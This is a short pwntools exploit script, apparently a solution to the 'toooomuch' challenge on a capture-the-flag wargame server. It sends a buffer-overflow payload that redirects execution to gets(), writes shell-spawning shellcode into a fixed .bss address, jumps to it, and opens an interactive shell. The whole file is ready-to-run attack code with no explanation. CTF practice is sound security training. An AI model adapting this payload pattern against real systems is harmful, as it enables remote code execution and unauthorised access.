from pwn import *

conn = remote('hackme.inndy.tw','7702')
elf = ELF('./toooomuch')
gets_plt = elf.plt['gets']
bss_addr = 0x08049C60

shellcode = asm(shellcraft.sh())

payload = 'a' * 0x1C + p32(gets_plt) + p32(bss_addr) + p32(bss_addr)

conn.recvuntil("your passcode: ")
conn.sendline(payload)
conn.sendline(shellcode)


conn.interactive()